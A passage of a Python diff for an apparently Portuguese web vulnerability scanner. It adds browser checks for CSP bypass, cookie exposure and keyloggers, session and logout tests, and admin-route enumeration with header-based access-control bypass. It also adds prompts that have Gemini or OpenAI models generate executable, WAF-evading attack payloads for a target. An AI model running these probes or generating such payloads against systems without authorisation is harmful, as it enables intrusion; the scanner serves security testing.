+                    url=self.target,
+                    evidence=f"Campos hidden com autocomplete sensível: {evidence}",
+                    recommendation="Remover autocomplete de campos hidden. Usar autocomplete='off' em campos sensíveis não visíveis.",
+                    technique="Playwright: hidden input + autocomplete detection")
+            else:
+                self.scanner._add(210, "Form Autofill Theft (Browser)", "Browser", "ALTO", "SEGURO",
+                    technique="Playwright: nenhum campo hidden com autocomplete sensível")
+        except Exception:
+            self.scanner._add(210, "Form Autofill Theft (Browser)", "Browser", "ALTO", "SEGURO",
+                technique="Playwright: erro ao verificar autofill")
+        finally:
+            page.close()
+
+    # ── 211: CSP Bypass Real ───────────────────────────────────────────────
+    def check_csp_bypass_real(self):
+        """Test if CSP actually blocks inline scripts in practice."""
+        page = self._new_page()
+        try:
+            MARKER = "CYBERDYNE_CSP_211"
+            self._console_logs.clear()
+
+            # Navigate and inject inline script
+            page.goto(self.target, timeout=10000, wait_until="domcontentloaded")
+            page.wait_for_timeout(1000)
+
+            # Try to execute inline JavaScript
+            csp_bypassed = page.evaluate(f"""() => {{
+                try {{
+                    const s = document.createElement('script');
+                    s.textContent = 'console.error("{MARKER}")';
+                    document.head.appendChild(s);
+                    return true;
+                }} catch(e) {{ return false; }}
+            }}""")
+
+            page.wait_for_timeout(1000)
+            marker_found = any(MARKER in entry.get("text", "") for entry in self._console_logs)
+
+            # Also test eval()
+            eval_works = page.evaluate("""() => {
+                try { eval('1+1'); return true; } catch(e) { return false; }
+            }""")
+
+            findings = []
+            if marker_found:
+                findings.append("Inline script executou (CSP não bloqueia script-src)")
+            if eval_works:
+                findings.append("eval() funciona (unsafe-eval ativo ou sem CSP)")
+
+            if findings:
+                ss = self._screenshot(page, "csp_bypass")
+                self.scanner._add(211, "CSP Bypass Real (Browser)", "Browser", "ALTO", "VULNERAVEL",
+                    url=self.target,
+                    evidence=" | ".join(findings),
+                    recommendation="Implementar CSP strict-dynamic. Remover unsafe-inline e unsafe-eval.",
+                    technique="Playwright: inline script injection + eval() test — execução real confirmada")
+            else:
+                self.scanner._add(211, "CSP Bypass Real (Browser)", "Browser", "ALTO", "SEGURO",
+                    technique="Playwright: CSP bloqueou inline script e eval() corretamente")
+        except Exception:
+            self.scanner._add(211, "CSP Bypass Real (Browser)", "Browser", "ALTO", "SEGURO",
+                technique="Playwright: erro ao testar CSP")
+        finally:
+            page.close()
+
+    # ── 212: Cookie Theft via JS ───────────────────────────────────────────
+    def check_cookie_theft_js(self):
+        """Check if session cookies are accessible via document.cookie (no HttpOnly)."""
+        page = self._new_page()
+        try:
+            page.goto(self.target, timeout=10000, wait_until="networkidle")
+            page.wait_for_timeout(2000)
+
+            js_cookies = page.evaluate("() => document.cookie")
+
+            sensitive_patterns = [
+                (r'(?i)(session|sess|sid|token|auth|jwt|access)', "Session/Auth cookie"),
+                (r'(?i)(phpsessid|jsessionid|asp\.net_sessionid)', "Framework session"),
+                (r'eyJ[A-Za-z0-9_-]{10,}', "JWT token"),
+            ]
+
+            exposed = []
+            if js_cookies:
+                for cookie_pair in js_cookies.split(";"):
+                    cookie_pair = cookie_pair.strip()
+                    for pattern, label in sensitive_patterns:
+                        if re.search(pattern, cookie_pair):
+                            name = cookie_pair.split("=")[0].strip()
+                            exposed.append(f"{name} ({label})")
+                            break
+
+            if exposed:
+                ss = self._screenshot(page, "cookie_theft")
+                self.scanner._add(212, "Cookie Theft via JS (Browser)", "Browser", "CRITICO", "VULNERAVEL",
+                    url=self.target,
+                    evidence=f"Cookies sensíveis acessíveis via JS: {', '.join(exposed[:5])}",
+                    recommendation="Adicionar flag HttpOnly em todos os cookies de sessão/auth.",
+                    technique="Playwright: document.cookie — XSS permitiria roubo de sessão")
+            else:
+                self.scanner._add(212, "Cookie Theft via JS (Browser)", "Browser", "CRITICO", "SEGURO",
+                    technique="Playwright: document.cookie sem cookies sensíveis expostos")
+        except Exception:
+            self.scanner._add(212, "Cookie Theft via JS (Browser)", "Browser", "CRITICO", "SEGURO",
+                technique="Playwright: erro ao verificar cookies")
+        finally:
+            page.close()
+
+    # ── 213: Keylogger Detection ───────────────────────────────────────────
+    def check_keylogger_detection(self):
+        """Detect suspicious keypress/keydown event listeners that capture all input."""
+        page = self._new_page()
+        try:
+            page.goto(self.target, timeout=10000, wait_until="domcontentloaded")
+            page.wait_for_timeout(2000)
+
+            keylogger = page.evaluate("""() => {
+                const findings = [];
+                // Check for global key event listeners
+                const scripts = Array.from(document.querySelectorAll('script:not([src])'));
+                for (const s of scripts) {
+                    const code = s.textContent.toLowerCase();
+                    if ((code.includes('keydown') || code.includes('keypress') || code.includes('keyup')) &&
+                        (code.includes('fetch') || code.includes('xmlhttprequest') || code.includes('ajax') ||
+                         code.includes('send') || code.includes('beacon'))) {
+                        findings.push('Keystroke capture + network exfiltration detected in inline script');
+                    }
+                }
+                // Check if document/body has key listeners that send data
+                const body = document.body;
+                if (body) {
+                    try {
+                        const events = typeof getEventListeners === 'function' ? getEventListeners(body) : {};
+                        if (events.keydown || events.keypress) {
+                            findings.push('Body-level key event listener detected');
+                        }
+                    } catch(e) {}
+                }
+                return findings;
+            }""")
+
+            if keylogger:
+                ss = self._screenshot(page, "keylogger")
+                self.scanner._add(213, "Keylogger Detection (Browser)", "Browser", "CRITICO", "VULNERAVEL",
+                    url=self.target,
+                    evidence="; ".join(keylogger[:3]),
+                    recommendation="Remover key listeners globais. Capturar apenas em campos específicos.",
+                    technique="Playwright: inline script analysis + event listener enumeration")
+            else:
+                self.scanner._add(213, "Keylogger Detection (Browser)", "Browser", "CRITICO", "SEGURO",
+                    technique="Playwright: nenhum keylogger detectado")
+        except Exception:
+            self.scanner._add(213, "Keylogger Detection (Browser)", "Browser", "CRITICO", "SEGURO",
+                technique="Playwright: erro ao verificar key listeners")
+        finally:
+            page.close()
+
+    # ── 214: Redirect Chain Analysis ───────────────────────────────────────
+    def check_redirect_chain(self):
+        """Follow full redirect chain, detect suspicious domains or HTTP in chain."""
+        page = self._new_page()
+        try:
+            chain = []
+            page.on("response", lambda resp: chain.append({
+                "url": resp.url, "status": resp.status,
+                "from": resp.request.redirected_from.url if resp.request.redirected_from else None
+            }))
+
+            page.goto(self.target, timeout=15000, wait_until="domcontentloaded")
+            page.wait_for_timeout(1000)
+
+            findings = []
+            target_domain = urlparse(self.target).netloc
+            for entry in chain:
+                url = entry.get("url", "")
+                # HTTP in chain (mixed content / downgrade)
+                if url.startswith("http://") and self.target.startswith("https://"):
+                    findings.append(f"HTTP downgrade no redirect chain: {url[:80]}")
+                # External domain in chain
+                entry_domain = urlparse(url).netloc
+                if entry_domain and target_domain and entry_domain != target_domain:
+                    if not any(cdn in entry_domain for cdn in ["cdn", "cloudflare", "akamai", "fastly", "googleapis"]):
+                        findings.append(f"Domínio externo no chain: {entry_domain}")
+
+            if findings:
+                ss = self._screenshot(page, "redirect_chain")
+                self.scanner._add(214, "Redirect Chain (Browser)", "Browser", "MEDIO", "VULNERAVEL",
+                    url=self.target,
+                    evidence=" | ".join(findings[:3]),
+                    recommendation="Eliminar HTTP redirects em cadeia HTTPS. Verificar domínios intermediários.",
+                    technique=f"Playwright: {len(chain)} responses na cadeia de redirect")
+            else:
+                self.scanner._add(214, "Redirect Chain (Browser)", "Browser", "MEDIO", "SEGURO",
+                    technique=f"Playwright: {len(chain)} responses — cadeia limpa")
+        except Exception:
+            self.scanner._add(214, "Redirect Chain (Browser)", "Browser", "MEDIO", "SEGURO",
+                technique="Playwright: erro ao analisar redirect chain")
+        finally:
+            page.close()
+
+    # ── 215: Shadow DOM Leak ───────────────────────────────────────────────
+    def check_shadow_dom_leak(self):
+        """Check for sensitive data inside open Shadow DOM elements."""
+        page = self._new_page()
+        try:
+            page.goto(self.target, timeout=10000, wait_until="networkidle")
+            page.wait_for_timeout(2000)
+
+            shadow_data = page.evaluate("""() => {
+                const findings = [];
+                const elements = document.querySelectorAll('*');
+                for (const el of elements) {
+                    if (el.shadowRoot && el.shadowRoot.mode === 'open') {
+                        const html = el.shadowRoot.innerHTML;
+                        const sensitivePatterns = [
+                            /password/i, /token/i, /api[_-]?key/i, /secret/i,
+                            /credential/i, /session/i, /bearer/i,
+                            /eyJ[A-Za-z0-9_-]{10,}/
+                        ];
+                        for (const pat of sensitivePatterns) {
+                            if (pat.test(html)) {
+                                findings.push({tag: el.tagName, pattern: pat.source, snippet: html.substring(0, 100)});
+                                break;
+                            }
+                        }
+                    }
+                }
+                return findings;
+            }""")
+
+            if shadow_data:
+                evidence = "; ".join(f"<{s['tag']}> contém '{s['pattern']}'" for s in shadow_data[:3])
+                ss = self._screenshot(page, "shadow_dom")
+                self.scanner._add(215, "Shadow DOM Leak (Browser)", "Browser", "ALTO", "VULNERAVEL",
+                    url=self.target,
+                    evidence=evidence,
+                    recommendation="Usar Shadow DOM 'closed' para dados sensíveis. Nunca armazenar secrets no DOM.",
+                    technique="Playwright: open Shadow DOM enumeration + sensitive pattern scan")
+            else:
+                self.scanner._add(215, "Shadow DOM Leak (Browser)", "Browser", "ALTO", "SEGURO",
+                    technique="Playwright: nenhum dado sensível em Shadow DOM")
+        except Exception:
+            self.scanner._add(215, "Shadow DOM Leak (Browser)", "Browser", "ALTO", "SEGURO",
+                technique="Playwright: erro ao verificar Shadow DOM")
+        finally:
+            page.close()
+
+    # ── 216: Network Data Exfiltration ─────────────────────────────────────
+    def check_network_interception(self):
+        """Monitor all network requests for data exfiltration and mixed content."""
+        page = self._new_page()
+        try:
+            requests_log = []
+
+            def log_request(request):
+                requests_log.append({
+                    "url": request.url,
+                    "method": request.method,
+                    "has_auth": "authorization" in {k.lower(): v for k, v in request.headers.items()},
+                    "is_http": request.url.startswith("http://"),
+                })
+
+            page.on("request", log_request)
+            page.goto(self.target, timeout=15000, wait_until="networkidle")
+            page.wait_for_timeout(3000)
+
+            findings = []
+            target_domain = urlparse(self.target).netloc
+
+            # Check for auth tokens sent to external domains
+            for req in requests_log:
+                req_domain = urlparse(req["url"]).netloc
+                if req["has_auth"] and req_domain != target_domain:
+                    findings.append(f"Auth token enviado para domínio externo: {req_domain}")
+                # Mixed content
+                if self.target.startswith("https://") and req["is_http"]:
+                    findings.append(f"Mixed content (HTTP em HTTPS): {req['url'][:60]}")
+
+            if findings:
+                ss = self._screenshot(page, "network_intercept")
+                self.scanner._add(216, "Network Data Exfiltration (Browser)", "Browser", "ALTO", "VULNERAVEL",
+                    url=self.target,
+                    evidence=" | ".join(list(dict.fromkeys(findings))[:5]),
+                    recommendation="Não enviar tokens para domínios externos. Eliminar mixed content.",
+                    technique=f"Playwright: {len(requests_log)} requests interceptadas")
+            else:
+                self.scanner._add(216, "Network Data Exfiltration (Browser)", "Browser", "ALTO", "SEGURO",
+                    technique=f"Playwright: {len(requests_log)} requests — nenhuma exfiltração")
+        except Exception:
+            self.scanner._add(216, "Network Data Exfiltration (Browser)", "Browser", "ALTO", "SEGURO",
+                technique="Playwright: erro ao interceptar network")
+        finally:
+            page.close()
+
     # ── Runner Principal ──────────────────────────────────────────────────
     def run_all(self):
         if not HAS_PLAYWRIGHT:
@@ -11931,7 +13531,7 @@ class CyberBrowser:
         log(f"  FASE 2.5 — BROWSER MIMIC (Playwright)")
         log(f"{'='*60}{Style.RESET_ALL}")
         log(f"  {Fore.MAGENTA}Anti-fingerprint + Bezier mouse + Human typing{Style.RESET_ALL}")
-        log(f"  {Fore.MAGENTA}6 checks client-side com browser real{Style.RESET_ALL}\n")
+        log(f"  {Fore.MAGENTA}16 checks client-side com browser real{Style.RESET_ALL}\n")
 
         try:
             self._start_browser()
@@ -11947,12 +13547,22 @@ class CyberBrowser:
             ("Storage Leak",           self.check_storage_leak),
             ("SPA Hidden Routes",      self.check_spa_hidden_routes),
             ("Clickjacking Real",      self.check_clickjacking_real),
+            ("WebSocket Hijacking",    self.check_websocket_hijacking),
+            ("Service Worker Spy",     self.check_service_worker_spy),
+            ("Clipboard Hijacking",    self.check_clipboard_hijacking),
+            ("Form Autofill Theft",    self.check_form_autofill_theft),
+            ("CSP Bypass Real",        self.check_csp_bypass_real),
+            ("Cookie Theft via JS",    self.check_cookie_theft_js),
+            ("Keylogger Detection",    self.check_keylogger_detection),
+            ("Redirect Chain",         self.check_redirect_chain),
+            ("Shadow DOM Leak",        self.check_shadow_dom_leak),
+            ("Network Interception",   self.check_network_interception),
         ]
 
         for i, (name, check_fn) in enumerate(checks, 1):
             if _cancel_event.is_set():
                 break
-            log(f"  {Fore.MAGENTA}[{i}/6] {name}...{Style.RESET_ALL}")
+            log(f"  {Fore.MAGENTA}[{i}/{len(checks)}] {name}...{Style.RESET_ALL}")
             try:
                 check_fn()
             except Exception as e:
@@ -13535,6 +15145,8 @@ class AuthenticatedCrawler:
         self.discovered_urls = set()
         self.visited         = set()
         self.forms_found     = []
+        self._login_time = 0
+        self._refresh_interval = 1800  # 30 minutes
 
     # ── Detectar formulário (reutiliza lógica do BruteForceProbe) ─────────
     def _detect_form(self, html, page_url):
@@ -13737,6 +15349,9 @@ class AuthenticatedCrawler:
         global _auth_cookies
         _auth_cookies = cookies_set
 
+        import time as _t
+        self._login_time = _t.time()
+
         # Adicionar a URL pós-login como ponto de partida do crawl
         self.discovered_urls.add(resp.url)
         self._extract_urls(resp.text, resp.url)
@@ -13807,6 +15422,8 @@ class AuthenticatedCrawler:
             if _cancel_event.is_set():
                 break
 
+            self._maybe_refresh_session()
+
             url = to_visit.pop(0)
             if url in self.visited:
                 continue
@@ -13849,11 +15466,267 @@ class AuthenticatedCrawler:
 
         return list(self.discovered_urls)
 
+    # ── Session refresh ─────────────────────────────────────────────────────
+    def _maybe_refresh_session(self):
+        """Refresh session if it's been more than 30 minutes since login."""
+        import time as _t
+        if self._login_time and (_t.time() - self._login_time > self._refresh_interval):
+            log(f"  {Fore.YELLOW}[AUTH] Sessão com {int((_t.time() - self._login_time) / 60)}min — refreshing...{Style.RESET_ALL}")
+            try:
+                self.login()
+                log(f"  {Fore.GREEN}[AUTH] Sessão renovada com sucesso{Style.RESET_ALL}")
+            except Exception as e:
+                log(f"  {Fore.RED}[AUTH] Falha ao renovar sessão: {e}{Style.RESET_ALL}")
+
+    # ── Logout / auth detection ──────────────────────────────────────────────
+    def _check_auth_alive(self, response):
+        """Check if session is still valid. Returns False if logged out."""
+        if not response:
+            return True  # can't determine
+        # Status-based detection
+        if response.status_code in (401, 403):
+            return False
+        # Redirect to login page
+        if response.status_code in (301, 302, 307, 308):
+            redirect_url = response.headers.get("Location", "").lower()
+            if any(kw in redirect_url for kw in ["login", "signin", "auth", "sso"]):
+                return False
+        # Body-based detection
+        body_low = response.text[:500].lower()
+        if any(kw in body_low for kw in ["session expired", "sessão expirada", "please log in",
+                                          "faça login", "unauthorized", "token expired"]):
+            return False
+        return True
+
+    # ── Session analysis ─────────────────────────────────────────────────────
+    def analyze_session(self):
+        """Analisa qualidade da sessão: JWT decode, entropia, cookie flags."""
+        findings = []
+
+        if not _auth_cookies:
+            return findings
+
+        for name, value in _auth_cookies.items():
+            # JWT detection and decode
+            if re.match(r'^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$', value):
+                try:
+                    parts = value.split(".")
+                    hdr_pad = parts[0] + "=" * (4 - len(parts[0]) % 4)
+                    pay_pad = parts[1] + "=" * (4 - len(parts[1]) % 4)
+                    header = json.loads(base64.urlsafe_b64decode(hdr_pad))
+                    payload = json.loads(base64.urlsafe_b64decode(pay_pad))
+
+                    alg = header.get("alg", "unknown")
+                    exp = payload.get("exp")
+                    iss = payload.get("iss", "unknown")
+                    sub = payload.get("sub", "unknown")
+                    role = payload.get("role", payload.get("user_type", "unknown"))
+
+                    log(f"  {Fore.CYAN}[SESSION] Cookie '{name}' é JWT:{Style.RESET_ALL}")
+                    log(f"    alg={alg} | iss={iss} | sub={sub} | role={role}")
+
+                    if exp:
+                        import time as _t
+                        remaining = exp - int(_t.time())
+                        if remaining < 0:
+                            findings.append(f"JWT '{name}' EXPIRADO ({abs(remaining)}s atrás)")
+                            log(f"    {Fore.RED}[!] TOKEN EXPIRADO{Style.RESET_ALL}")
+                        elif remaining < 3600:
+                            findings.append(f"JWT '{name}' expira em {remaining}s")
+                            log(f"    {Fore.YELLOW}[~] Expira em {remaining//60}min{Style.RESET_ALL}")
+
+                    if alg.lower() in ("none", "hs256"):
+                        findings.append(f"JWT '{name}' usa algoritmo fraco: {alg}")
+
+                except Exception:
+                    pass
+
+            # Entropy analysis for non-JWT cookies
+            else:
+                if len(value) >= 16:
+                    freq = {}
+                    for c in value:
+                        freq[c] = freq.get(c, 0) + 1
+                    entropy = -sum((count/len(value)) * math.log2(count/len(value)) for count in freq.values())
+                    if entropy < 3.0:
+                        findings.append(f"Cookie '{name}' tem baixa entropia ({entropy:.1f}) — previsível")
+                        log(f"  {Fore.YELLOW}[SESSION] Cookie '{name}' baixa entropia: {entropy:.1f} bits{Style.RESET_ALL}")
+
+                    # Sequential detection
+                    if value.isdigit():
+                        findings.append(f"Cookie '{name}' é numérico puro — incrementável")
+
+        # Cookie flags analysis (from response headers)
+        try:
+            r = requests.get(self.login_url, headers=HEADERS_BASE, timeout=8,
+                            verify=False, allow_redirects=False)
+            set_cookie = r.headers.get("Set-Cookie", "")
+            if set_cookie:
+                flags = set_cookie.lower()
+                if "httponly" not in flags:
+                    findings.append("Cookies sem HttpOnly — acessíveis via JavaScript (XSS → session hijack)")
+                if "secure" not in flags:
+                    findings.append("Cookies sem Secure — enviados via HTTP (interceptação)")
+                if "samesite" not in flags:
+                    findings.append("Cookies sem SameSite — vulnerável a CSRF")
+        except Exception:
+            pass
+
+        return findings
+
+    # ── Concurrent session test ──────────────────────────────────────────────
+    def test_concurrent_sessions(self):
+        """Test if server allows multiple active sessions."""
+        if not _auth_cookies:
+            return None
+
+        # Save current cookies
+        original_cookies = dict(_auth_cookies)
+
+        # Login again to get a SECOND session
+        try:
+            session2 = requests.Session()
+            # Detect form
+            r = session2.get(self.login_url, headers=HEADERS_BASE, timeout=8, verify=False)
+            if not r:
+                return None
+            action, user_field, pass_field, hidden = self._detect_form(r.text, self.login_url)
+            if not user_field or not pass_field:
+                return None
+
+            data = dict(hidden)
+            data[user_field] = self.username
+            data[pass_field] = self.password
+            r2 = session2.post(action, data=data, headers=HEADERS_BASE,
+                              timeout=10, verify=False, allow_redirects=True)
+
+            # Check if original session still works
+            test_url = self.login_url.rsplit("/", 1)[0] or self.login_url
+            r_original = requests.get(test_url, cookies=original_cookies, headers=HEADERS_BASE,
+                                     timeout=8, verify=False, allow_redirects=False)
+
+            if r_original and r_original.status_code not in (401, 403):
+                return {"vulnerable": True,
+                        "evidence": "Servidor permite sessões simultâneas — sessão anterior não invalidada após novo login"}
+            else:
+                return {"vulnerable": False,
+                        "evidence": "Servidor invalidou sessão anterior após novo login"}
+        except Exception:
+            return None
+
+    # ── Logout verification ──────────────────────────────────────────────────
+    def verify_logout(self):
+        """Test if logout actually invalidates the session."""
+        if not _auth_cookies:
+            return None
+
+        saved_cookies = dict(_auth_cookies)
+
+        # Find logout endpoint
+        logout_paths = ["/logout", "/signout", "/api/auth/logout", "/api/logout",
+                       "/auth/logout", "/api/auth/signout", "/api/v1/auth/logout"]
+
+        logout_url = ""
+        base = self.login_url.rsplit("/", 1)[0] if "/" in self.login_url[8:] else self.login_url
+
+        for path in logout_paths:
+            test_url = base.rstrip("/") + path
+            try:
+                r = requests.get(test_url, cookies=saved_cookies, headers=HEADERS_BASE,
+                               timeout=5, verify=False, allow_redirects=True)
+                if r and r.status_code in (200, 302):
+                    logout_url = test_url
+                    break
+            except Exception:
+                continue
+
+        if not logout_url:
+            return None
+
+        # After "logout", try using the old cookies
+        try:
+            r_after = requests.get(base, cookies=saved_cookies, headers=HEADERS_BASE,
+                                  timeout=8, verify=False, allow_redirects=False)
+            if r_after and r_after.status_code not in (401, 403, 302):
+                return {"vulnerable": True,
+                        "evidence": f"Sessão NÃO invalidada após logout ({logout_url}). Cookie antigo ainda funciona."}
+            else:
+                return {"vulnerable": False,
+                        "evidence": "Sessão invalidada corretamente após logout"}
+        except Exception:
+            return None
+
+    # ── Role enumeration ─────────────────────────────────────────────────────
+    def enumerate_roles(self):
+        """Test if authenticated user can access admin routes."""
+        if not _auth_cookies:
+            return []
+
+        admin_paths = ["/admin", "/dashboard", "/api/admin", "/api/admin/users",
+                      "/api/v1/admin", "/settings", "/manage", "/panel",
+                      "/api/users", "/api/accounts", "/internal", "/backoffice"]
+
+        accessible = []
+        base = self.login_url.rsplit("/", 1)[0] if "/" in self.login_url[8:] else self.login_url
+
+        for path in admin_paths:
+            url = base.rstrip("/") + path
+            try:
+                # With auth
+                r_auth = requests.get(url, cookies=_auth_cookies, headers=HEADERS_BASE,
+                                     timeout=6, verify=False, allow_redirects=False)
+                if not r_auth or r_auth.status_code in (404, 405):
+                    continue
+
+                # Without auth (comparison)
+                r_no_auth = requests.get(url, headers=HEADERS_BASE,
+                                        timeout=6, verify=False, allow_redirects=False)
+
+                # If auth gives 200 but no-auth gives 401/403/302 → user has access to admin route
+                if r_auth.status_code == 200 and (not r_no_auth or r_no_auth.status_code in (401, 403, 302)):
+                    # Verify it's real admin content
+                    if any(kw in r_auth.text.lower()[:500] for kw in
+                           ["admin", "dashboard", "manage", "users", "settings", "config"]):
+                        accessible.append({"path": path, "status": r_auth.status_code,
+                                         "evidence": "Rota admin acessível com credenciais de usuário normal"})
+
+                # Test with privilege escalation headers
+                for header_name, header_val in [
+                    ("X-Forwarded-For", "127.0.0.1"),
+                    ("X-Original-URL", path),
+                    ("X-Rewrite-URL", path),
+                ]:
+                    if r_no_auth and r_no_auth.status_code in (401, 403):
+                        r_bypass = requests.get(url, headers={**HEADERS_BASE, header_name: header_val},
+                                              timeout=6, verify=False, allow_redirects=False)
+                        if r_bypass and r_bypass.status_code == 200:
+                            accessible.append({"path": path, "status": r_bypass.status_code,
+                                             "evidence": f"Bypass via {header_name}: {header_val}",
+                                             "technique": "Header-based access control bypass"})
+            except Exception:
+                continue
+
+        return accessible
+
     # ── Execução completa ─────────────────────────────────────────────────────
     def run(self):
         """Executa login + crawl. Retorna lista de URLs autenticadas ou [] se falhar."""
         if not self.login():
             return []
+
+        # Session analysis
+        session_findings = self.analyze_session()
+        if session_findings:
+            for finding in session_findings:
+                log(f"  {Fore.YELLOW}[SESSION] {finding}{Style.RESET_ALL}")
+
+        # Role enumeration (if login worked)
+        role_results = self.enumerate_roles()
+        if role_results:
+            log(f"  {Fore.RED}[ROLE ENUM] {len(role_results)} rotas admin acessíveis!{Style.RESET_ALL}")
+            for rr in role_results[:3]:
+                log(f"    {Fore.RED}→ {rr['path']}: {rr['evidence']}{Style.RESET_ALL}")
+
         urls = self.crawl()
         # Resumo dos formulários encontrados
         if self.forms_found:
@@ -13893,38 +15766,142 @@ def _stealth_delay():
 # ─────────────────────────────────────────────────────────────────────────────
 _AI_PAYLOADS_MODE = False
 _gemini_tokens_used = 0
+_openai_tokens_used = 0
 
-def _ai_generate_payloads(vuln_type, context_html, url=""):
-    """Usa Gemini para gerar payloads específicos baseados no HTML do alvo."""
-    global _gemini_tokens_used
-    if not GEMINI_API_KEY or not _AI_PAYLOADS_MODE:
+def _ai_generate_payloads(vuln_type, context_html, url="", tech_stack=None, form_fields=None, waf_detected=None):
+    """AI-powered contextual payload generation. Gemini primary, OpenAI fallback."""
+    global _gemini_tokens_used, _openai_tokens_used
+    if not _AI_PAYLOADS_MODE:
         return []
+    if not GEMINI_API_KEY and not OPENAI_API_KEY:
+        return []
+
+    # Build rich context prompt
+    _stack_str = ", ".join(tech_stack) if tech_stack else "desconhecido"
+    _fields_str = ", ".join(form_fields[:10]) if form_fields else "nenhum detectado"
+    _waf_str = waf_detected if waf_detected else "nenhum detectado"
+    _params = []
+    if url and "?" in url:
+        from urllib.parse import urlparse, parse_qs
+        _pq = parse_qs(urlparse(url).query)
+        _params = list(_pq.keys())[:8]
+    _params_str = ", ".join(_params) if _params else "nenhum"
+
     prompt = (
-        f"Você é um especialista em segurança web. Analise o HTML abaixo e gere EXATAMENTE 15 payloads "
-        f"específicos para testar {vuln_type} neste contexto. "
-        f"Considere: nomes de variáveis, frameworks detectados, estrutura de forms, event handlers. "
-        f"Retorne APENAS os payloads, um por linha, sem explicações, sem numeração, sem markdown.\n\n"
-        f"URL: {url}\n"
-        f"HTML (primeiros 2000 chars):\n{context_html[:2000]}"
+        f"ROLE: Penetration tester sênior especializado em {vuln_type}.\n"
+        f"ALVO: {url[:120] if url else 'N/A'}\n"
+        f"STACK TECNOLÓGICA: {_stack_str}\n"
+        f"WAF DETECTADO: {_waf_str}\n"
+        f"CAMPOS DE FORMULÁRIO: {_fields_str}\n"
+        f"PARÂMETROS URL: {_params_str}\n"
+        f"HTML CONTEXTO (primeiros 2500 chars):\n{context_html[:2500]}\n\n"
+        f"TAREFA: Gere EXATAMENTE 15 payloads de {vuln_type} ESPECÍFICOS para este alvo.\n"
+        f"REGRAS:\n"
+        f"- Adapte ao WAF detectado (use encoding duplo, case variation, null bytes, unicode se necessário)\n"
+        f"- Encaixe nos nomes dos campos/parâmetros reais do alvo\n"
+        f"- Considere o framework para exploits específicos (ex: Next.js server actions, Django template tags)\n"
+        f"- Cada payload DEVE usar técnica DIFERENTE (não variações do mesmo)\n"
+        f"- Inclua pelo menos 3 payloads com WAF bypass encoding\n"
+        f"- Payloads devem ser executáveis diretamente, sem modificação\n\n"
+        f"FORMATO: Um payload por linha. Sem explicação, sem numeração, sem markdown, sem aspas envolventes."
     )
-    try:
-        api_url = (
-            "https://generativelanguage.googleapis.com/v1beta/models/"
-            f"gemini-2.0-flash-lite:generateContent?key={GEMINI_API_KEY}"
-        )
-        body = {"contents": [{"parts": [{"text": prompt}]}],
-                "generationConfig": {"temperature": 0.7, "maxOutputTokens": 1024}}
-        r = requests.post(api_url, json=body, timeout=20)
-        if r.status_code == 200:
-            data = r.json()
-            _gemini_tokens_used += data.get("usageMetadata", {}).get("totalTokenCount", 500)
-            parts = data.get("candidates", [{}])[0].get("content", {}).get("parts", [{}])
-            text = parts[0].get("text", "").strip() if parts else ""
-            payloads = [line.strip() for line in text.splitlines() if line.strip() and not line.startswith("#")]
-            return payloads[:15]
+
+    # Try Gemini first
+    if GEMINI_API_KEY:
+        try:
+            api_url = (
+                "https://generativelanguage.googleapis.com/v1beta/models/"
+                f"gemini-2.0-flash-lite:generateContent?key={GEMINI_API_KEY}"
+            )
+            body = {"contents": [{"parts": [{"text": prompt}]}],
+                    "generationConfig": {"temperature": 0.7, "maxOutputTokens": 1024}}
+            r = requests.post(api_url, json=body, timeout=25)
+            if r.status_code == 200:
+                data = r.json()
+                _gemini_tokens_used += data.get("usageMetadata", {}).get("totalTokenCount", 500)
+                parts = data.get("candidates", [{}])[0].get("content", {}).get("parts", [{}])
+                text = parts[0].get("text", "").strip() if parts else ""
+                payloads = [line.strip() for line in text.splitlines() if line.strip() and not line.startswith("#")]
+                if payloads:
+                    return payloads[:15]
+        except Exception:
+            pass
+
+    # Fallback to OpenAI
+    if OPENAI_API_KEY:
+        try:
+            r = requests.post(
+                "https://api.openai.com/v1/chat/completions",
+                headers={"Authorization": f"Bearer {OPENAI_API_KEY}", "Content-Type": "application/json"},
+                json={
+                    "model": "gpt-4o-mini",
+                    "messages": [
+                        {"role": "system", "content": "You are an expert penetration tester. Respond ONLY with payloads, one per line, no explanations."},
+                        {"role": "user", "content": prompt}
+                    ],
+                    "temperature": 0.7,
+                    "max_tokens": 1024
+                },
+                timeout=25
+            )
+            if r.status_code == 200:
+                data = r.json()
+                _openai_tokens_used += data.get("usage", {}).get("total_tokens", 500)
+                text = data["choices"][0]["message"]["content"].strip()
+                payloads = [line.strip() for line in text.splitlines() if line.strip() and not line.startswith("#")]
+                if payloads:
+                    return payloads[:15]
+        except Exception:
+            pass
+
+    return []
+
+
+def _ai_feedback_round(vuln_type, url, failed_payloads, waf_pattern=""):
+    """Round 2: bypass payloads. Only in --insane mode."""
+    global _gemini_tokens_used, _openai_tokens_used
+    if _PAYLOAD_INTENSITY < 1.0 or (not GEMINI_API_KEY and not OPENAI_API_KEY):
         return []
-    except Exception:
+    if not _AI_PAYLOADS_MODE or not failed_payloads:
         return []
+    failed_summary = "\n".join(f"  BLOCKED: {p[:80]}" for p in failed_payloads[:5])
+    prompt = (
+        f"WAF bypass specialist. Alvo: {url[:120]}\n"
+        f"WAF: {waf_pattern or 'desconhecido'}\n\n"
+        f"Payloads BLOQUEADOS:\n{failed_summary}\n\n"
+        f"Gere 5 payloads {vuln_type} que BYPASSEM este filtro.\n"
+        f"Técnicas: double encoding, unicode, null bytes, case alternation, comment insertion.\n"
+        f"Um por linha, sem explicação."
+    )
+    # Reuse the same AI call logic
+    if GEMINI_API_KEY:
+        try:
+            api_url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash-lite:generateContent?key={GEMINI_API_KEY}"
+            body = {"contents": [{"parts": [{"text": prompt}]}],
+                    "generationConfig": {"temperature": 0.8, "maxOutputTokens": 512}}
+            r = requests.post(api_url, json=body, timeout=20)
+            if r.status_code == 200:
+                data = r.json()
+                _gemini_tokens_used += data.get("usageMetadata", {}).get("totalTokenCount", 300)
+                parts = data.get("candidates", [{}])[0].get("content", {}).get("parts", [{}])
+                text = parts[0].get("text", "").strip() if parts else ""
+                return [l.strip() for l in text.splitlines() if l.strip()][:5]
+        except Exception:
+            pass
+    if OPENAI_API_KEY:
+        try:
+            r = requests.post("https://api.openai.com/v1/chat/completions",
+                headers={"Authorization": f"Bearer {OPENAI_API_KEY}", "Content-Type": "application/json"},
+                json={"model": "gpt-4o-mini", "messages": [{"role": "user", "content": prompt}],
+                      "temperature": 0.8, "max_tokens": 512}, timeout=20)
